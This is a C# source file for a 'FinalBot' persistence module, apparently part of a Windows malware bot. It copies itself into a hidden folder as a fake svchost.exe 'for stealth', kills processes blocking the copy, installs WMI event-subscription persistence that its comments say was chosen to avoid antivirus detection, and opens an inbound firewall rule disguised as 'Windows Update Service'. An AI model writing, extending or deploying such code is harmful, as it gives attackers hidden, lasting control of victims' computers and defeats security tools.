using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using VanguardCore;

namespace FinalBot
{
    public static class Persistence
    {
        public static void Install()
        {
            AddFirewallException();
            try
            {
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                // Use LocalAppData as it is often less restricted than Roaming/Protect
                string localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string targetDir = Path.Combine(localData, "Microsoft", "Windows", "UpdateService");
                string targetPath = Path.Combine(targetDir, "svchost.exe"); // Named svchost for stealth

                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                if (selfPath.ToLower() != targetPath.ToLower())
                {
                    try
                    {
                        // Try to kill existing process if it prevents overwrite
                        foreach (var p in Process.GetProcessesByName("svchost"))
                        {
                            try 
                            { 
                                // Only kill if it's OUR svchost (checking path)
                                if (p.MainModule?.FileName.ToLower() == targetPath.ToLower())
                                {
                                    p.Kill(); 
                                    p.WaitForExit(1000); 
                                }
                            } 
                            catch { }
                        }
                        File.Copy(selfPath, targetPath, true);
                        File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception ex)
                    {
                        Logger.Warn($"[PERSISTENCE] Initial copy failed: {ex.Message}. Trying random name.");
                        targetPath = Path.Combine(targetDir, $"svc_{Guid.NewGuid().ToString().Substring(0,8)}.exe");
                        File.Copy(selfPath, targetPath, true);
                    }
                }

                // ONLY WMI Event Subscription (invisible, survives registry scans)
                // Removed Registry Run Key and SchTasks as they cause static AV detections
                InstallWMI(targetPath);

                Logger.Info("[PERSISTENCE] WMI stealth method installed.");
            }
            catch (Exception ex)
            {
                Logger.Error("Persistence installation failed", ex);
            }
        }

        private static void InstallWMI(string exePath)
        {
            try
            {
                // Use the safe PowerShell-based method from PersistManager
                PersistManager.InstallWMIEvent(exePath);
                Logger.Info("[PERSISTENCE] WMI Event Subscription installed via PowerShell.");
            }
            catch (Exception ex)
            {
                Logger.Warn($"[PERSISTENCE] WMI failed: {ex.Message}");
            }
        }

        private static void AddFirewallException()
        {
            try
            {
                if (!VanguardCore.ElevationService.IsAdmin()) return;
                
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                string cmd = $"New-NetFirewallRule -DisplayName 'Windows Update Service' -Direction Inbound -Program '{selfPath}' -Action Allow -ErrorAction SilentlyContinue";
                Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-Command \"{cmd}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        public static void Uninstall()
        {
            try
            {
                using RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key?.DeleteValue("SecurityHealthSvcHost", false);
            }
            catch { }
        }
    }
}
